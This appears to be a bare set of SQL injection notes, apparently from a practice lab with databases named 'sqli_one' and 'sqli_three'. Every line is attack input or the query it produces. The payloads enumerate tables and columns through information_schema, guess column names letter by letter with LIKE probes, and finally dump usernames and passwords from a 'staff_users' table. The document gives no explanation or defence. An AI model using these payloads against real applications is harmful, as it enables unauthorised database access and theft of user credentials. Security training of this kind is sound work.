admin123' UNION SELECT 1,2,3 FROM information_schema.tables 
WHERE table_schema = 'sqli_three' and table_name like 'a%';--

select * from users where username = 'admin123' UNION SELECT 1,2,3 
FROM information_schema.tables WHERE table_schema = 'sqli_three' and 
table_name='users';--' LIMIT 1 

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS 
WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and 
COLUMN_NAME like 'a%';

admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS 
WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and 
COLUMN_NAME like 'b%' and COLUMN_NAME !='id';

select * from article where id = 0 UNION SELECT 1,2,group_concat(table_name) 
FROM information_schema.tables WHERE table_schema = 'sqli_one'
<= 0 UNION SELECT 1,2,group_concat(table_name) 
FROM information_schema.tables WHERE table_schema = 'sqli_one'

select * from article where id = 0 UNION SELECT 1,2,group_concat(column_name) 
FROM information_schema.columns WHERE table_name = 'staff_users'
<= 0 UNION SELECT 1,2,group_concat(column_name) 
FROM information_schema.columns WHERE table_name = 'staff_users'

0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') 
FROM staff_users
